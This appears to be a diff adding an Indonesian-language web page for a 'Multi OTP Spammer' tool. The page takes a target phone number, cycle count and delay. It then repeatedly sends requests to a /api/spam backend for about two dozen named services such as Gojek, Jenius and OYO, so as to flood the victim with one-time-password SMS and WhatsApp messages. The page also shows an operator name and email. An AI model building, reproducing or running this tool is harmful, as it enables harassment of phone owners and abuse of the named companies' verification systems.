@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RILZY DEX — MULTI OTP SPAMMER 2K26</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background:#05010a; color:#00fff9; font-family:'Share Tech Mono',monospace;
+    min-height:100vh; display:flex; justify-content:center; align-items:center;
+    overflow-x:hidden; padding:20px 0;
+    background-image:
+      radial-gradient(circle at 20% 20%, rgba(255,0,200,.15), transparent 40%),
+      radial-gradient(circle at 80% 80%, rgba(0,255,249,.15), transparent 40%),
+      repeating-linear-gradient(0deg, rgba(0,255,249,.03) 0px, transparent 2px, transparent 4px);
+  }
+  .grid-overlay {
+    position:fixed; inset:0; pointer-events:none;
+    background-image:linear-gradient(rgba(255,0,200,.08) 1px,transparent 1px),
+                     linear-gradient(90deg,rgba(0,255,249,.08) 1px,transparent 1px);
+    background-size:40px 40px; animation:gridMove 12s linear infinite;
+  }
+  @keyframes gridMove { from{background-position:0 0,0 0} to{background-position:0 40px,40px 0} }
+  .panel {
+    position:relative; width:94%; max-width:640px;
+    background:rgba(10,0,20,.85); border:2px solid #ff00c8;
+    box-shadow:0 0 25px #ff00c8, inset 0 0 25px rgba(0,255,249,.15);
+    padding:34px 26px;
+    clip-path:polygon(0 0,calc(100% - 24px) 0,100% 24px,100% 100%,24px 100%,0 calc(100% - 24px));
+    backdrop-filter:blur(4px);
+  }
+  .panel::before {
+    content:"RILZY_DEX // NETLIFY-OTP v2.0.2.6"; position:absolute; top:-14px; left:18px;
+    background:#05010a; padding:0 10px; color:#ff00c8; font-size:12px; letter-spacing:3px;
+    text-shadow:0 0 8px #ff00c8;
+  }
+  h1 {
+    font-family:'Orbitron',sans-serif; font-weight:900; font-size:24px; text-align:center;
+    letter-spacing:3px; color:#00fff9; text-shadow:0 0 10px #00fff9,0 0 25px #ff00c8; margin-bottom:4px;
+  }
+  .sub { text-align:center; font-size:11px; letter-spacing:2px; color:#ff00c8; margin-bottom:20px; text-shadow:0 0 8px #ff00c8; }
+  .mail { text-align:center; font-size:11px; color:#7a5cff; margin-bottom:22px; letter-spacing:1px; }
+  label { display:block; font-size:11px; letter-spacing:2px; color:#00fff9; margin-bottom:6px; text-transform:uppercase; }
+  input, select {
+    width:100%; padding:12px 14px; background:#0a0014; border:1px solid #7a5cff; color:#00fff9;
+    font-family:'Share Tech Mono',monospace; font-size:14px; margin-bottom:16px; outline:none; transition:.2s;
+    clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,10px 100%,0 calc(100% - 10px));
+  }
+  input:focus,select:focus { border-color:#ff00c8; box-shadow:0 0 14px #ff00c8; }
+  .row { display:flex; gap:12px; } .row > div { flex:1; }
+  button {
+    width:100%; margin-top:8px; padding:14px; font-family:'Orbitron',sans-serif; font-weight:700;
+    font-size:15px; letter-spacing:4px; background:linear-gradient(90deg,#ff00c8,#7a5cff,#00fff9);
+    color:#05010a; border:none; cursor:pointer;
+    clip-path:polygon(0 0,calc(100% - 14px) 0,100% 14px,100% 100%,14px 100%,0 calc(100% - 14px));
+    transition:.25s; text-transform:uppercase;
+  }
+  button:hover { filter:brightness(1.3); box-shadow:0 0 30px #00fff9; letter-spacing:6px; }
+  button:disabled { opacity:.5; cursor:not-allowed; }
+  #log {
+    margin-top:20px; height:260px; overflow-y:auto; background:#05010a;
+    border:1px solid #7a5cff; padding:12px; font-size:11px; line-height:1.7; color:#00fff9;
+  }
+  #log div { border-bottom:1px dashed rgba(122,92,255,.3); padding:2px 0; }
+  .ok { color:#00ff88; } .warn { color:#ffaa00; } .err { color:#ff0044; } .pink { color:#ff00c8; }
+  ::-webkit-scrollbar { width:6px; } ::-webkit-scrollbar-thumb { background:#ff00c8; }
+</style>
+</head>
+<body>
+<div class="grid-overlay"></div>
+
+<div class="panel">
+  <h1>MULTI OTP SPAMMER</h1>
+  <div class="sub">◢ NETLIFY PROXY CYBERPUNK 2K26 ◣</div>
+  <div class="mail">operator: RILZY DEX &nbsp;|&nbsp; moonstarstore001@gmail.com</div>
+
+  <label>Target Number</label>
+  <input type="text" id="target" placeholder="+62812xxxx">
+
+  <div class="row">
+    <div>
+      <label>Cycles</label>
+      <input type="number" id="cycles" value="5" min="1" max="999">
+    </div>
+    <div>
+      <label>Delay (ms)</label>
+      <input type="number" id="delay" value="600" min="200" max="5000">
+    </div>
+  </div>
+
+  <label>Endpoint Mode</label>
+  <select id="mode">
+    <option value="all">SEMUA ENDPOINT (burst penuh)</option>
+    <option value="stable">Hanya yang stabil</option>
+    <option value="wa">WhatsApp / SMS only</option>
+  </select>
+
+  <button id="startBtn" onclick="startSpam()">▶ MULAI SPAM SEMUA</button>
+
+  <div id="log"></div>
+</div>
+
+<script>
+const logEl = document.getElementById('log');
+const startBtn = document.getElementById('startBtn');
+let running = false;
+
+function log(msg, cls = '') {
+  const t = new Date().toLocaleTimeString('id-ID');
+  const d = document.createElement('div');
+  d.className = cls;
+  d.innerHTML = `[${t}] ${msg}`;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function normalize(n) {
+  return n.replace(/[\s\-]/g,'').replace(/^\+?62/,'').replace(/^0/,'');
+}
+
+async function hitEndpoint(ep, target) {
+  try {
+    const res = await fetch('/api/spam', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ endpoint: ep, target })
+    });
+    const data = await res.json();
+    const code = data.code || 0;
+    const cls = (code >= 200 && code < 300) ? 'ok' : (code === 429 ? 'warn' : 'err');
+    const errMsg = data.error ? ` (${data.error})` : '';
+    log(`[${ep}] ${code} → ${target}${errMsg}`, cls);
+    return code;
+  } catch (e) {
+    log(`[${ep}] x pipeline error → ${target} (${e.message})`, 'err');
+    return 0;
+  }
+}
+
+async function startSpam() {
+  if (running) return;
+  const target = document.getElementById('target').value.trim();
+  const cycles = parseInt(document.getElementById('cycles').value) || 5;
+  const delay  = parseInt(document.getElementById('delay').value) || 600;
+  const mode   = document.getElementById('mode').value;
+
+  if (!target) { log('❌ nomor target kosong','err'); return; }
+  const clean = normalize(target);
+  if (!/^\d{8,14}$/.test(clean)) { log('❌ format nomor tidak valid (contoh +62812xxxx)','err'); return; }
+
+  const ALL = ['klikindomaret','klikwa','battlefront','pinjamindo','jumpstart','asani',
+               'qtva','icq','cairin','bukuwarung','misteraladin','kredito','gojek','oyo',
+               'foa','jenius','pizzahut','matahari','depop','harvestcake','danacita',
+               'sayurbox','tokko','carsome','ktbs'];
+
+  const STABLE = ['klikindomaret','battlefront','pinjamindo','jumpstart','asani','icq',
+                  'cairin','misteraladin','kredito','gojek','oyo','foa','jenius','pizzahut',
+                  'matahari','depop','harvestcake','danacita','carsome','ktbs'];
+
+  const WA = ['klikwa','qtva','bukuwarung','sayurbox','tokko'];
+
+  let pool = mode === 'stable' ? STABLE : (mode === 'wa' ? WA : ALL);
+
+  running = true;
+  startBtn.disabled = true;
+  log(`▶ NETLIFY MULTI-BURST — ${pool.length} endpoint x ${cycles} cycle | target ${target}`, 'pink');
+  log(`operator: RILZY DEX | moonstarstore001@gmail.com`, 'pink');
+
+  let total = 0;
+  for (let c = 1; c <= cycles; c++) {
+    if (!running) break;
+    log(`— CYCLE ${c}/${cycles} —`, 'pink');
+    for (const ep of pool) {
+      if (!running) break;
+      await hitEndpoint(ep, target);
+      total++;
+      await new Promise(r => setTimeout(r, delay));
+    }
+  }
+  log(`✔ SELESAI — ${total} request diproses ke ${target}`, 'ok');
+  running = false;
+  startBtn.disabled = false;
+}
+</script>
+</body>
+</html>
